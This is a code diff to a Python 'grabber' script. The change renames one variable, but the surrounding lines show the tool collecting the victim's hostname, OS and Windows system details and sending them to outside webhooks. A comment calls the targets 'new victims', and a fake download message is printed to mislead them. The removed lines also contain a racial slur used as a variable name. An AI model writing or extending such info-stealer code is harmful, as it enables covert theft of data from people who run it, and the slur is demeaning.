@@ -13,7 +13,7 @@ op.system("color 0a") #cool color in windows cmd
 fname = "holyshit.txt" #saves the ip data as txt files
 
 whobedum = poggchamp.gethostname() # gets the host name using socket module
-mynigga = halal.uname() #using the platform module grabs usefull info about host pc.
+slay = halal.uname() #using the platform module grabs usefull info about host pc.
 windowsop = wmi.WMI() #using the wmi platform grab info about the windows pc.
 macsuxs = windowsop.Win32_ComputerSystem()[0] #Win32 module from wmi
 
@@ -50,12 +50,12 @@ AbhiQ Grabber=
 Hostname = {whobedum}
 ---------------------------------------------------------------------
 **---------------------------System Info-----------------------------**
-System = {mynigga.system}
-Node Name = {mynigga.node}
-Release = {mynigga.release}
-Machine = {mynigga.machine}
-Processor = {mynigga.processor}
-Version = {mynigga.version}
+System = {slay.system}
+Node Name = {slay.node}
+Release = {slay.release}
+Machine = {slay.machine}
+Processor = {slay.processor}
+Version = {slay.version}
 -------------------------------------------------------------------
 **----------------------------Windows PC----------------------------**
 Manufacturer = {macsuxs.Manufacturer}
@@ -74,7 +74,7 @@ CC@ https://github.com/abhinav-ranish
 #Nowifi dump and since its on another channel creates a sub heading for new victims
 
 Wbhook_nowifi.send(f"**Hostname = {whobedum}**")
-Wbhook_wifi.send(f"**Node Name = {mynigga.node}**  **Name = {macsuxs.Name}** ")
+Wbhook_wifi.send(f"**Node Name = {slay.node}**  **Name = {macsuxs.Name}** ")
 
 print("downloading python==1.39 -------------------/------------") #some fake shit like a pro gamer
 
